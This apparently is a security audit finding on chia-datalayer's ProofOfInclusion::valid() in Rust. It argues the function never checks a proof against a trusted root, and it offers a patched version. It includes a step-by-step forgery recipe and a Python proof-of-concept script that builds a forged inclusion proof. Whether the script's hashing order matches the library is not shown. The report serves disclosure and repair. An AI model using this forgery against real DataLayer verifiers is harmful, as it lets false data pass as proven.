### Title
`ProofOfInclusion::valid()` Does Not Verify Against a Trusted Root — Forged DataLayer Inclusion Proofs Pass Validation - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` only verifies the internal hash-chain consistency of a proof object. Its final equality check is a tautology — it compares `existing_hash` against `self.root_hash()`, which is defined as `last.combined_hash`, the exact value `existing_hash` was just set to inside the loop. The function never compares the computed root against any external trusted root. An attacker who can supply a serialized `ProofOfInclusion` (via `from_bytes()`, `from_json_dict()`, or the Python `__new__` constructor) can forge a proof for any arbitrary `node_hash` that will unconditionally pass `valid()`.

### Finding Description

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← existing_hash = layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← root_hash() returns last.combined_hash
}
``` [1](#0-0) 

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same value as existing_hash after the loop
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop body sets `existing_hash = calculated_hash` and the loop has verified `calculated_hash == layer.combined_hash`, the final check `existing_hash == self.root_hash()` reduces to `last.combined_hash == last.combined_hash`, which is always `true`. The function never takes a caller-supplied trusted root as input and never compares against one.

`ProofOfInclusion` is `Streamable` and fully exposed through Python bindings with `from_bytes()`, `from_json_dict()`, and a direct `__new__` constructor: [3](#0-2) [4](#0-3) 

### Impact Explanation

An attacker who can deliver a serialized `ProofOfInclusion` to any DataLayer verifier that calls only `proof.valid()` can prove inclusion of an arbitrary `node_hash` (i.e., any key-value pair hash) against a fabricated root. The forged proof is constructed as follows:

1. Choose any target `node_hash` (the leaf hash to falsely claim is included).
2. Choose any `other_hash` and `other_hash_side`.
3. Compute `combined_hash = calculate_internal_hash(node_hash, other_hash_side, other_hash)`.
4. Construct `ProofOfInclusion { node_hash, layers: [ProofOfInclusionLayer { other_hash_side, other_hash, combined_hash }] }`.
5. `proof.valid()` returns `true`; `proof.root_hash()` returns the attacker-chosen `combined_hash`.

This matches the allowed High impact: **DataLayer Merkle proof logic lets untrusted input prove invalid state / accepts forged inclusion**.

### Likelihood Explanation

The `valid()` function is the sole public API for verifying a `ProofOfInclusion`. Its name strongly implies complete proof validation. Any DataLayer consumer that calls `proof.valid()` without separately comparing `proof.root_hash()` against a locally-trusted tree root is fully vulnerable. The Python bindings make this pattern trivially reachable from unprivileged network input. [5](#0-4) 

### Recommendation

`valid()` must accept a `trusted_root: &Hash` parameter and replace the final tautological check with a comparison against it:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against external trusted root
}
```

All call sites (Rust and Python) must be updated to supply the trusted root obtained from the local `MerkleBlob` or an on-chain commitment.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Arbitrary target leaf hash (attacker-chosen)
node_hash = bytes(range(32))

# Arbitrary sibling hash
other_hash = bytes(range(32, 64))

# Compute combined_hash to make the chain internally consistent
h = hashlib.sha256()
h.update(b"\x01")          # internal node prefix used by calculate_internal_hash
h.update(node_hash)
h.update(other_hash)
combined_hash = h.digest()

layer = ProofOfInclusionLayer(
    other_hash_side=0,      # Left
    other_hash=other_hash,
    combined_hash=combined_hash,
)
proof = ProofOfInclusion(node_hash=node_hash, layers=[layer])

assert proof.valid()        # True — forged proof passes validation
# proof.root_hash() == combined_hash (attacker-controlled, not the real tree root)
